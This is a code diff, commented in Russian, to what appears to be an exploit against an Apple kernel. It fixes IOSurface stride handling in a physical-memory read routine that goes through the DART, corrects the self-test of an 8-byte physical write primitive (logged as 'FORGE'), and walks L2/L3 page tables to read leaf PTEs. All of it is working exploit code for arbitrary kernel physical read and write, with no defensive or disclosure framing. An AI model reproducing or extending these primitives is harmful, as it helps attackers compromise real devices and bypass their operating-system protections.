@@ -158,7 +158,11 @@ static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, u
                           uint8_t *out, NSMutableString *r)
 {
     memset(out, 0, 0x4000);
-    NSDictionary *spB = @{(__bridge id)kIOSurfaceWidth: @1024, (__bridge id)kIOSurfaceHeight: @64,
+    // 1.9.259b: пара 4096×16 BGRA (stride 0x4000) — любой оффсет 16KB-страницы
+    // ложится на y=0 (x=boff/4 ≤ 4094): rect с y≠0 не работает (ноль, 259-я),
+    // а 16KB-оффсеты L3-записей требуют y>0 на 1024-широких поверхностях.
+    // (off,len) ключ кэша = 0x40000 — конфликта с srcS/dstS (0x80000) нет.
+    NSDictionary *spB = @{(__bridge id)kIOSurfaceWidth: @4096, (__bridge id)kIOSurfaceHeight: @16,
                           (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
     IOSurfaceRef rdS = IOSurfaceCreate((__bridge CFDictionaryRef)spB);
     IOSurfaceRef dsS = IOSurfaceCreate((__bridge CFDictionaryRef)spB);
@@ -234,7 +238,7 @@ static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, u
             IOSurfaceLock(dsS, 0, NULL);
             uint8_t *spR = (uint8_t *)IOSurfaceGetBaseAddress(dsS);
             uint32_t rlen = rw * rh * 4; if (rlen > 0x4000) rlen = 0x4000;
-            if (spR) memcpy(out, spR + (uint64_t)ry * 0x1000 + (uint64_t)rx * 4, rlen);
+            if (spR) memcpy(out, spR + (uint64_t)ry * 0x4000 + (uint64_t)rx * 4, rlen);   // stride 0x4000 (4096-wide)
             IOSurfaceUnlock(dsS, 0, NULL);
             kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] target=%#llx rect{%u,%u,%u,%u} kr=0x%x sig=%#010x flags=%#x",
                       (unsigned long long)targetPA, rx, ry, rw, rh, rkr, *(uint32_t *)out, fR]);
@@ -7917,18 +7921,22 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     uint64_t markW = 0x1122334455667788ULL;
                     BOOL rectOK = NO;
                     if (buf247 && srcS) {
+                        uint64_t pre0 = *(volatile uint64_t *)(ctl + 0x300);
+                        uint64_t pre2 = *(volatile uint64_t *)(ctl + 0x310);
                         rectOK = kpPhysWrite8(svc, buf247, srcID, dstID, srcS, tsdV, ctlPA, markW, r);
                         uint64_t c0 = *(volatile uint64_t *)(ctl + 0x300);
                         uint64_t c1 = *(volatile uint64_t *)(ctl + 0x308);
                         uint64_t c2 = *(volatile uint64_t *)(ctl + 0x310);
-                        rectOK = rectOK && c1 == markW && c0 == 0xCCCCCCCCCCCCCCCCULL && c2 == 0xCCCCCCCCCCCCCCCCULL;
+                        // 1.9.259b: соседи сравниваем с ПРЕД-записью (ctl уже 0x41 от
+                        // победного physwrite, не 0xCC — ошибка чека 259-й).
+                        rectOK = rectOK && c1 == markW && c0 == pre0 && c2 == pre2;
                         kpNote(r, [NSString stringWithFormat:@"  [FORGE] rect self-test: ctl+0x300=%#018llx +0x308=%#018llx +0x310=%#018llx — %@",
                                   (unsigned long long)c0, (unsigned long long)c1, (unsigned long long)c2,
                                   rectOK ? @"RECT ПОДТВЕРЖДЁН (8 байт точно)" : @"МИМО — 8-байтовый rect не работает"]);
                     }
                     uint8_t timg[0x4000];
                     uint32_t boff = tidx * 8;
-                    uint32_t rx = (boff % 0x1000) / 4, ry = boff / 0x1000;
+                    uint32_t rx = (boff % 0x4000) / 4, ry = boff / 0x4000;   // stride 0x4000 → y=0 всегда
                     kpNote(r, [NSString stringWithFormat:@"  [FORGE] walker встал на L%d tte=%#llx — physread rect {%u,%u,2,1} через DART",
                               kp_lastDeadlyLvl, (unsigned long long)kp_lastDeadlyTte, rx, ry]);
                     if (kpPhysRead16K(svc, tsdV, ttM, isTable, tpage, rx, ry, 2, 1, timg, r)) {
@@ -7938,7 +7946,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             uint32_t l3idx = (uint32_t)((pageVA >> 14) & 0x7ff);
                             uint32_t b3 = l3idx * 8;
                             kpNote(r, [NSString stringWithFormat:@"  [FORGE] L2[%u] → L3 таблица %#llx, читаю её", tidx, (unsigned long long)l3pa]);
-                            if (!kpPhysRead16K(svc, tsdV, ttM, isTable, l3pa, (b3 % 0x1000) / 4, b3 / 0x1000, 2, 1, timg, r)) pte = 0;
+                            if (!kpPhysRead16K(svc, tsdV, ttM, isTable, l3pa, (b3 % 0x4000) / 4, b3 / 0x4000, 2, 1, timg, r)) pte = 0;
                             else memcpy(&pte, timg, 8);
                         }
                         kpNote(r, [NSString stringWithFormat:@"  [FORGE] leaf PTE = %#018llx (rectOK=%d)", pte, rectOK]);
